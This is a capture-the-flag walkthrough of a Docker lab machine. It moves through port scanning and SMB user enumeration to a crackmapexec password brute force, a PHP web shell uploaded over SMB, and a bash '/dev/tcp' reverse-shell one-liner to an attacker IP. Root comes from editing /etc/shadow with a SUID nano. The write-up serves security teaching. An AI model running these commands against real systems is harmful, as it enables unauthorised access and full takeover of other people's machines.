![Screenshot](/medium/Domain/Images/machine.png)

Difficulty: **medium**

Made by: **el pinguino de mario**

---
# Steps to pwn 🥽

* 👁️‍🗨️ [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all, we make sure the machine is active, we can verify with ping:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.176 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.103 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.109 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.103/0.129/0.176/0.033 ms
```

Now we can start the phase of reconnaissance.

---

# Reconnaissance

We can make a nmap scan to search what ports are open from the machine:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 20:45 -05
Initiating ARP Ping Scan at 20:45
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 20:45, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:45
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Completed SYN Stealth Scan at 20:45, 3.17s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000028s latency).
Scanned at 2025-11-05 20:45:18 -05 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.55 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to make the scan to search from the port 1 to the port 65535

**-n** <- With this argument we skip the DNS resolution, sometimes this type of scan can slow down the speed of our scan, and it's not that necessary to do it.

**-sS** <- With this argument, we are going to make a stealth-scan, this means that will not be establish the 3-way-handshake with the machine, and also can speed up our scan and be more "sneaky" 

**--min-rate 5000** <- With this argument nmap will send at least 5000 packages per second, this can speed up our scan significantly.

**-Pn** <- With this argument we also are going to skip the host discovery phase, this means that nmap will treat the machine as active, we do this before with our ping command.

**-vv** <- With this argument nmap will show us the results while the scan continues, this means if nmap discover a open port, will be reported immediately as the scan continues.

**--open** <- With this argument will only show us the ports that are open.

When the scan concludes, we can see that are 3 ports open: port 80 (http), port 139 (Netbios / SMB), and the port 445 (also SMB).

I decide to see more about these ports, like the versions and know more about those, we can use nmap in this too.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ nmap -p80,139,445 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 21:10 -05
Nmap scan report for 172.17.0.2
Host is up (0.000063s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
|_http-server-header: Apache/2.4.52 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| smb2-time: 
|   date: 2025-11-06T02:10:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds
```

**-p80,139,445** <- With this argument we are telling to nmap to only scan this 3 ports we discover before.

**-sCV** <- With this argument nmap will scan per each port his version and also a little bit more of information.

Okay when the scan finish, we see a website, normally when I see a website I do a scan with whatweb, to found what technologies uses this website.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], Title[¿Qué es Samba?]
```

We not see not too much here, we can see the website use apache and that's it, let's take a look on the browser.

![Screenshot](/medium/Domain/Images/image1.png)

We can see this, this show us like a summary of what is samba. And nothing more, we can do some enumeration to this website but we got nothing.

---
# Enumeration

We can use a tool that's is **enum4linux**, this tool can enumerate a system of linux, like a overall, it can enumerate users from the system, workspaces and a lot more.

Lets use this tool, and let's see what can extract.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ enum4linux 172.17.0.2 -a
```

**-a** <- With this argument we tell to this tool, to run a robust set of enumeration, we can use this to extract all the possible information from a system.

Let's execute this now.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ enum4linux 172.17.0.2 -a
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Nov  5 21:48:30 2025

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.17.0.2 )=============================


[E] Can't find workgroup/domain



 =================================( Nbtstat Information for 172.17.0.2 )=================================

Looking up status of 172.17.0.2
No reply from 172.17.0.2

 ====================================( Session Check on 172.17.0.2 )====================================


[+] Server 172.17.0.2 allows sessions using username '', password ''


 =================================( Getting domain SID for 172.17.0.2 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ====================================( OS information on 172.17.0.2 )====================================


[E] Can't get OS info with smbclient


[+] Got OS info for 172.17.0.2 from srvinfo: 
        7F02C47512A2   Wk Sv PrQ Unx NT SNT 7f02c47512a2 server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ========================================( Users on 172.17.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james    Name: james     Desc: 
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob      Name: bob       Desc: 

user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]

 ==================================( Share Enumeration on 172.17.0.2 )==================================
                                                                                                                    
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                               

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        html            Disk      HTML Share
        IPC$            IPC       IPC Service (7f02c47512a2 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                          
                                                                                                                    
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                   
//172.17.0.2/html       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                      
                                                                                                                    
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                          
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 172.17.0.2 )=============================
                                                                                                                    
Password:                                                                                                           


[+] Attaching to 172.17.0.2 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] 7F02C47512A2
        [+] Builtin

[+] Password Info for Domain: 7F02C47512A2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                
                                                                                                                    
                                                                                                                    
Password Complexity: Disabled                                                                                       
Minimum Password Length: 5


 ========================================( Groups on 172.17.0.2 )========================================
                                                                                                                    
                                                                                                                    
[+] Getting builtin groups:                                                                                         
                                                                                                                    
                                                                                                                    
[+]  Getting builtin group memberships:                                                                             
                                                                                                                    
                                                                                                                    
[+]  Getting local groups:                                                                                          
                                                                                                                    
                                                                                                                    
[+]  Getting local group memberships:                                                                               
                                                                                                                    
                                                                                                                    
[+]  Getting domain groups:                                                                                         
                                                                                                                    
                                                                                                                    
[+]  Getting domain group memberships:                                                                              
                                                                                                                    
                                                                                                                    
 ===================( Users on 172.17.0.2 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                    
                                                                                                                    
[I] Found new SID:                                                                                                  
S-1-22-1                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[I] Found new SID:                                                                                                  
S-1-5-32                                                                                                            

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                         
                                                                                                                    
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                   
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-288789915-3882980836-2223788321 and logon username '', password ''         
                                                                                                                    
S-1-5-21-288789915-3882980836-2223788321-501 7F02C47512A2\nobody (Local User)                                       
S-1-5-21-288789915-3882980836-2223788321-513 7F02C47512A2\None (Domain Group)
S-1-5-21-288789915-3882980836-2223788321-1000 7F02C47512A2\james (Local User)
S-1-5-21-288789915-3882980836-2223788321-1001 7F02C47512A2\bob (Local User)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                         
                                                                                                                    
S-1-22-1-1000 Unix User\bob (Local User)                                                                            
S-1-22-1-1001 Unix User\james (Local User)

 ================================( Getting printer info for 172.17.0.2 )================================
                                                                                                                    
No printers returned.                                                                                               


enum4linux complete on Wed Nov  5 21:49:47 2025
```

it seems a lot of information, but if we take a closer look, we can notice that exists 2 users, **bob and james** with this information, we can try to brute force with this users.

And also we see a **share** in this machine, we can see some contents like html.

---
# Exploitation

We can try to brute force through SMB, why? because we got a share, we can get sometimes useful information here.

A tool for this purpose we can use it's **crackmapexec** this tool can try to brute force multiple technologies like: smb, winrm, ldap, etc...

Let's execute the next command:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ crackmapexec -t 20 smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt
```

**-t 20** <- With this argument we are going to use threads to make this be more fast to exploit, in this case we are going to use 20 threads.

**smb** <- We are attacking this technology, the port 139 or the port 445

**-u bob** <- With this argument we specify the user that ere going to try, in this case with the user bob, that we got before with enum4linux.

**-p** <- With this argument we introduce a dictionary of passwords to try.

Now lets see what happen.

![Screenshot](/medium/Domain/Images/image2.png)

And we got success! we found the password of the user bob, the pass is **star** 

We are going to try if we can login in with this user.

![Screenshot](/medium/Domain/Images/image3.png)

The login works, and also we are into the directory of html.

We get the file of index.html, this means we get the code of the website we see before, this directory it seems that is **/var/www/html**

And we can also upload a file here on smb, we can try to make a reverse shell with a file, in this case we are going to use a php file.

![Screenshot](/medium/Domain/Images/image4.png)

This code what it does is it get through the system the command line, this means we can use the typical commands we use in a linux system.

**Note**: if you want to do this more straightforward you can also get the reverse shell with pentestmonkey, I do this because I like this to be more manual.

Then we save the file and we upload this in the directory of html with smb, we can use the command **put** to upload this file.

![Screenshot](/medium/Domain/Images/image5.png)

Now when the file uploads, with the browser are going to visit again the website, but in the next path:

- http://172.17.0.2/shell.php

Then we see this:

![Screenshot](/medium/Domain/Images/image6.png)

This error occurs  because the request we made through the browser it's not correct, because it needs the parameter **cmd**, something like this must be the request:

- http://172.17.0.2/shell.php?cmd={cmd_here!}

![Screenshot](/medium/Domain/Images/image7.png)

finally we get a **web shell**, and also we can make a reverse shell like this:

- **bash -c 'bash -i >%26 /dev/tcp/{attacker's ip}/{port} 0>%261'**

this one liner it executes bash and makes a shell interactive and the traffic will reach us to our ip address and the port that we are in **listening**, you might be wondering what it's that thing **%26** ?

This is the url encoded version of the symbol **ampersand** (&), sometimes when we do a request to a website, needs to be encoded in this format, to receive it correctly the request.

Before we make this request we must be in **listening** with netcat:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ nc -lvnp {PORT}
listening on [any] {PORT} ...
```

**-l**  <- This argument makes to netcat to be in mode listening.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Then we launch the command waiting for our connection with the reverse shell.

And finally we make our request in the browser to establish the connection with our terminal.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 55334
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@7f02c47512a2:/var/www/html$ 
```

And finally we are in into the machine.

We can make some treatment of the tty to make this reverse shell more comfortable to be with.

First of all we do this:

```
www-data@7f02c47512a2:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```
www-data@7f02c47512a2:/var/www/html$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

![Screenshot](/medium/Domain/Images/image8.png)

We can adjust this to be more bigger with the next command:

```
stty rows {num} columns {num}
```

and finally it looks way better!

---

After all of this process we can continue to our machine.

We now are going to try if the credentials of the user bob that we got before, that his password are **star** also works on the system.

```
www-data@7f02c47512a2:/home$ su bob
Password: 
bob@7f02c47512a2:/home$ 
```

And yes, the user bob uses the same password.

---
# Privilege Escalation

We can start with this command to find out if there is some possible SUID (set user id), this can be a way to make a privilege escalation with the following command:

```
bob@7f02c47512a2:~$ find / -perm -4000 2>/dev/null
```

With this command we are finding some possible files that have a permission of SUID

Then we see this:

```
bob@7f02c47512a2:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/nano
bob@7f02c47512a2:~$ 
```

We have something here, we can see that **nano** have a SUID

**Fun fact:** if some text editor have permissions of SUID, sudo, that means we can edit ***any*** file of the system, we can edit the **/etc/passwd/ and also the /etc/shadow/ file!** this files saves the passwords of the users of the system, even with the user root, in this case im going to edit the **shadow** file.

First of all we need to go to the directory /usr/bin/

and then we execute the next command:

```
bob@7f02c47512a2:/usr/bin$ ./nano /etc/shadow
```

With this we execute the nano editor and this opens the shadow file and we can see this:

![Screenshot](/medium/Domain/Images/image9.png)

Once we delete that symbol, we save the file with CTRL + S and we exit of nano.

Now we are going to change to the user root, and let's see if the exploitation work.

![Screenshot](/medium/Domain/Images/image10.png)

Now we are the user root ***...Pwned!...*** 
